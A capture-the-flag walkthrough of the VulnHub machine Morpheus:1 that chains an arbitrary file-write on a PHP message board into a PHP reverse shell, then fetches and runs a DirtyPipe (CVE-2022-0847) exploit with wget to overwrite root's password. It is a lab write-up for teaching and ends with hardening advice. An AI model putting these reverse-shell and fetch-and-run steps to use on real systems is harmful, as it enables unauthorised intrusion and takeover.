<h1 align="center">🐧 Morpheus:1 — Penetration Testing Walkthrough</h1>
<h3 align="center">From Reconnaissance to Root Access — A Complete CTF Guide</h3>

<p align="center">
  <img src="https://img.shields.io/badge/Penetration-Testing-red" alt="Pentest">
  <img src="https://img.shields.io/badge/Difficulty-Intermediate-orange" alt="Difficulty">
  <img src="https://img.shields.io/badge/Category-CTF-blue" alt="CTF">
  <img src="https://img.shields.io/badge/Status-Completed-green" alt="Completed">
  <img src="https://img.shields.io/badge/Platform-VulnHub-purple" alt="Platform">
</p>

> **Attacker IP:** `192.168.56.12` &nbsp;·&nbsp; **Target IP:** `192.168.56.18`

---

## 📖 Table of Contents
- [Overview](#-overview)
- [Objectives](#-objectives)
- [1. Reconnaissance](#1-reconnaissance)
- [2. Web Enumeration](#2-web-enumeration)
- [3. Exploitation — From Graffiti to Shell](#3-exploitation--from-graffiti-to-shell)
- [4. Privilege Escalation](#4-privilege-escalation)
- [5. Capturing the Final Flag](#5-capturing-the-final-flag)
- [6. Summary of Attack Chain](#6-summary-of-attack-chain)
- [Key Takeaways](#-key-takeaways)
- [Security Recommendations](#-security-recommendations)
- [Tools Used](#-tools-used)

---

## 📋 Overview
This guide documents the complete penetration testing methodology for **Morpheus:1**, detailing every step from initial reconnaissance to privilege escalation and flag capture. The box hinges on an arbitrary file-write vulnerability in a web message board, chained into a kernel-level privilege escalation via **DirtyPipe (CVE-2022-0847)**.

## 🎯 Objectives
- Identify the target system and open services
- Enumerate web content and hidden functionality
- Exploit a file-write vulnerability to gain a foothold
- Escalate privileges using a kernel exploit
- Capture both flags

---

## 1. Reconnaissance

### 🌐 Host Discovery
After bringing the VM online, confirm the attacker interface, then sweep the lab network for live hosts.

```bash
$ ifconfig
# eth0: inet 192.168.56.12

$ nmap -sn 192.168.56.0/24
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s1.png" alt="ifconfig confirming attacker interface" width="600"/>
</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s2.png" alt="nmap ping sweep locating the target" width="600"/>
</p>

The scan reveals the target at **`192.168.56.18`** (Oracle VirtualBox virtual NIC).

### 🛰️ Service Enumeration
An aggressive Nmap scan maps the attack surface.

```bash
$ nmap -A 192.168.56.18
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s3.png" alt="Nmap aggressive scan results" width="600"/>
</p>

**Findings:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 8.4p1 Debian 5 (protocol 2.0) |
| 80/tcp | HTTP | Apache httpd 2.4.51 (Debian) |
| 81/tcp | HTTP | nginx 1.18.0 (Basic Auth required) |

The web server on port 80 returns a *Matrix*-themed Boot2Root landing page:

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s4.png" alt="Port 80 Matrix-themed landing page" width="600"/>
</p>

Port 81 presents an HTTP Basic Auth dialog (`realm="Meeting Place"`), noted for later:

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s5.png" alt="Port 81 HTTP Basic Auth prompt" width="600"/>
</p>

---

## 2. Web Enumeration

### 📂 Content Discovery
**Gobuster** brute-forces directories and files on port 80.

```bash
$ gobuster dir -u http://192.168.56.18 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x .php,.txt,.html
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s6.png" alt="Gobuster directory brute-force results" width="600"/>
</p>

**Notable findings:** `/index.html` · `/1.php` · `/info.php` · `/test.php` · `/javascript/` · `/robots.txt` · `/alien.php` · `/graffiti.txt` · `/graffiti.php` · `/server-status` (403 Forbidden)

`/robots.txt` returns a taunt: *"There's no white rabbit here. Keep searching!"*

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s7.png" alt="robots.txt taunt message" width="600"/>
</p>

### 🖍️ The Graffiti Wall
`/graffiti.php` loads a message board titled **"Nebuchadnezzar Graffiti Wall."** It lets users post messages, which are then written to `/graffiti.txt` and displayed on the page — an immediate candidate for a **file-write / path-traversal** vulnerability.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s8.png" alt="Nebuchadnezzar Graffiti Wall message board" width="600"/>
</p>

---

## 3. Exploitation — From Graffiti to Shell

### 🕸️ Proxy Setup
Route Firefox through **Burp Suite** to inspect the graffiti form submission:

1. **Firefox → Settings → Network Settings → Settings…**
2. Select **Manual proxy configuration**
3. Set **HTTP Proxy** to `127.0.0.1:8080` with **"Also use this proxy for HTTPS"** checked
4. In **Burp Suite → Proxy → Proxy settings**, confirm the listener on `127.0.0.1:8080`
5. Turn **Intercept ON**

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s9.png" alt="Firefox manual proxy configuration" width="600"/>
</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s10.png" alt="Firefox proxy settings confirmed" width="600"/>
</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s11.png" alt="Burp Suite proxy listener settings" width="600"/>
</p>

### 🎯 Intercepting the Request
Submitting a test message on the graffiti wall, Burp intercepts the POST request:

```http
POST /graffiti.php HTTP/1.1
Host: 192.168.56.18
...
Content-Type: application/x-www-form-urlencoded

message=to+be+intercepted+by+burp&file=graffiti.txt
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s12.png" alt="Burp Intercept toggled on" width="600"/>
</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s13.png" alt="Intercepted graffiti POST request" width="600"/>
</p>

The `file` parameter controls the destination filename — meaning it's possible to write to **any** file the web server has permission to touch, including `.php` files in the web root.

### 🐚 Weaponizing the File Write
Grab **pentestmonkey's PHP reverse shell** and edit the top variables to point back to the attacker machine:

```php
$ip = '192.168.56.12';   // CHANGE THIS
$port = 7777;            // CHANGE THIS
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s14.png" alt="Editing the PHP reverse shell IP and port" width="600"/>
</p>

Send the intercepted graffiti POST to **Repeater** (`Ctrl+R`), replace the message body with the full reverse shell payload, and change the `file` parameter from `graffiti.txt` to **`intercept.php`**:

```http
POST /graffiti.php HTTP/1.1
...

message=<?php ... // php-reverse-shell payload ... ?>&file=intercept.php
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s15.png" alt="Burp Repeater request with intercept.php payload" width="600"/>
</p>

Clicking **Send** returns **`HTTP/1.1 200 OK`** — the shell has been written to `/intercept.php`.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s16.png" alt="200 OK response confirming the file write" width="600"/>
</p>

### 📡 Catching the Shell
Start a netcat listener on the attacker machine:

```bash
$ nc -lvnp 7777
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s17.png" alt="netcat listener started" width="600"/>
</p>

Visiting `http://192.168.56.18/intercept.php` in the browser hangs the page — and the listener lights up:

```
connect to [192.168.56.12] from (UNKNOWN) [192.168.56.18] 37650
Linux morpheus 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s18.png" alt="Reverse shell connecting back as www-data" width="600"/>
</p>

Spawn a proper TTY for stability:

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s19.png" alt="TTY upgrade with pty.spawn" width="600"/>
</p>

A quick look around the filesystem reveals the first flag sitting in the root of the web tree:

```bash
www-data@morpheus:/$ ls /
www-data@morpheus:/$ cat FLAG.txt
Flag 1!
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s20.png" alt="First flag captured" width="600"/>
</p>

---

## 4. Privilege Escalation

### 🔎 Post-Exploitation Recon
With a low-privilege shell as `www-data`, run **LinPEAS** to automate enumeration of misconfigurations and known CVEs.

> **Note:** When moving files from the attacker VM to the vulnerable machine, `cd /tmp` first — it's universally writable and the safest place to stage payloads without triggering permission errors or leaving obvious artifacts in user directories.

```bash
www-data@morpheus:/$ cd /tmp
www-data@morpheus:/tmp$ wget http://192.168.56.12:5678/linpeas1.sh
www-data@morpheus:/tmp$ chmod +x linpeas1.sh
www-data@morpheus:/tmp$ ./linpeas1.sh
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s21.png" alt="Staging linpeas1.sh in /tmp" width="600"/>
</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s22.png" alt="Running linpeas1.sh" width="600"/>
</p>

LinPEAS flags several kernel CVEs — the most critical being **CVE-2022-0847 (DirtyPipe)**.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s23.png" alt="LinPEAS flagging CVE-2022-0847" width="600"/>
</p>

### 🩸 DirtyPipe (CVE-2022-0847)
DirtyPipe is a Linux kernel vulnerability allowing unprivileged users to overwrite arbitrary files in read-only mounts — most notably `/etc/passwd` — by exploiting a flaw in the pipe buffer code. The target runs a vulnerable kernel (`5.10.70`), making this a direct shot to root.

Clone the public exploit repository (on the attacker VM):

```bash
$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s24.png" alt="Cloning the DirtyPipe exploit repository" width="600"/>
</p>

The repository includes a `compile.sh` script. The original script produces dynamically-linked binaries — but **this VulnHub machine lacks the shared libraries needed to run standard compiled executables** — so `compile.sh` was edited to use **`gcc -static`** for static linking, baking all dependencies into the binary and making it portable to the target.

```bash
# Edited compile.sh
$ gcc -static exploit1.c -o exploit-9
$ gcc -static exploit2.c -o exploit-6
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s25.png" alt="Editing compile.sh for static linking" width="600"/>
</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s26.png" alt="Statically compiling the exploit binaries" width="600"/>
</p>

Serve the compiled binaries via a Python HTTP server from the attacker VM:

```bash
$ python3 -m http.server 5678
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s27.png" alt="Serving exploit binaries with python3 http.server" width="600"/>
</p>

Pull them down to the target (again, from `/tmp`):

```bash
www-data@morpheus:/tmp$ wget http://192.168.56.12:5678/exploit-9
www-data@morpheus:/tmp$ chmod +x exploit-9
www-data@morpheus:/tmp$ ./exploit-9
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s28.png" alt="Downloading exploit-9 to the target" width="600"/>
</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s29.png" alt="Making exploit-9 executable" width="600"/>
</p>

The exploit executes flawlessly:

```
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s30.png" alt="DirtyPipe exploit overwriting root password" width="600"/>
</p>

### 🏁 Becoming Root
With the root password now set to **`piped`**, switch users:

```bash
www-data@morpheus:/tmp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@morpheus:/$ su root
Password: piped
root@morpheus:/# whoami
root
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s31.png" alt="Switching to root with su" width="600"/>
</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s32.png" alt="Confirming root access with whoami" width="600"/>
</p>

---

## 5. Capturing the Final Flag

With root access secured, navigate to `/root` and claim the prize:

```bash
root@morpheus:/# cd /root
root@morpheus:/root# ls
FLAG.txt
root@morpheus:/root# cat FLAG.txt
You've won!

Let's hope Matrix: Resurrections rocks!
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s33.png" alt="Navigating to /root as root" width="600"/>
</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s34.png" alt="Listing /root contents" width="600"/>
</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s35.png" alt="Final flag captured" width="600"/>
</p>

🎉 **Root access achieved — both flags captured!**

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s36.png" alt="Full root shell session overview" width="600"/>
</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s37.png" alt="Attack chain recap" width="600"/>
</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s38.png" alt="Final root confirmation" width="600"/>
</p>

---

## 6. Summary of Attack Chain

| Phase | Technique | Tool / Payload |
|-------|-----------|----------------|
| Recon | Network & service scan | `nmap -sn`, `nmap -A` |
| Enumeration | Directory brute-force | `gobuster` |
| Exploitation | File-write via `file` parameter | Burp Suite + PHP reverse shell |
| Initial Access | Reverse shell callback | `nc -lvnp 7777` |
| Post-Exploitation | Automated privesc enumeration | `linpeas.sh` |
| Privilege Escalation | Kernel exploit (DirtyPipe) | `CVE-2022-0847` static binary |
| Root Access | Password overwrite + `su` | Custom-compiled `exploit-9` |

---

## 🔑 Key Takeaways

1. **Always use `gcc -static`** when compiling exploits for unknown target environments — dynamically-linked binaries often fail on stripped-down VMs lacking standard libraries.
2. **Stage files in `/tmp`** when transferring payloads to a compromised host — it avoids permission issues and keeps the workflow clean.
3. **Intercept everything.** The graffiti wall looked benign until Burp revealed the `file` parameter — a clear example of why proxying all traffic matters.
4. **Kernel version is king.** LinPEAS plus a quick CVE check turned a potentially long privesc hunt into a single-exploit root.

---

## 🔒 Security Recommendations

- **Input Validation** — Never let user input control a filename or file path server-side; the `file` parameter on the graffiti wall should be hardcoded, not client-supplied
- **File Upload/Write Restrictions** — Restrict the web server process from writing files with executable extensions (`.php`, `.cgi`, etc.) into web-servable directories
- **Kernel Patch Management** — Keep kernels current; DirtyPipe (CVE-2022-0847) was patched shortly after disclosure and this box remained vulnerable
- **Least Privilege** — Run web application processes (`www-data`) with the minimum filesystem permissions necessary
- **Log Monitoring** — Alert on unexpected file writes to the web root and unusual outbound connections (e.g. reverse shell callbacks)

---

## 🔧 Tools Used

**🛡️ Network & Service Discovery**
`ifconfig` · `nmap` · `gobuster`

**🔓 Exploitation**
Burp Suite · PHP reverse shell (pentestmonkey) · `netcat`

**🔍 Information Gathering**
`linpeas.sh` · `cat` · `ls`

**💻 Privilege Escalation**
`gcc -static` · CVE-2022-0847 (DirtyPipe) · `su`

---

<p align="center">
  <strong>Documentation created for educational purposes</strong><br>
  All techniques should be practiced only in controlled, authorized environments.
</p>
